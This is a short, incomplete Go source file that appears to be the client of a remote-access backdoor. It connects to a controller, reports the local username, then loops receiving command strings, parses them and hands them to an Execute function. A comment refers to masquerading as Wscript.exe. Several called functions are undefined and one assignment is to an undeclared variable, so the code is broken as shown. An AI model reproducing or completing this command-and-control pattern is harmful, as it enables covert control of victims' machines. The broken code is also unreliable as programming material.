package main

import (
    "strings"
)
const TARGET_FILE_NAME = "shell"   // check name Wscript.exe

func main() {
    c, _ = Connect()
    go Send("user", GetUsername())
    ListenAndExecute()
}

func ListenAndExecute() {
    for {
        status := Receive()
        go ParseProtocol(status)
    }

}

func ParseProtocol(r string) {
    commandBuff := strings.Split(r, " ")
        if len(commandBuff) > 1 {
            cmd := commandBuff[0]
            target := commandBuff[1]
            args := "null"
            if len(commandBuff) >= 3 {
                args = commandBuff[2]
            }
            //Concurrently executes command
            Execute(cmd, target, args)
        }
}
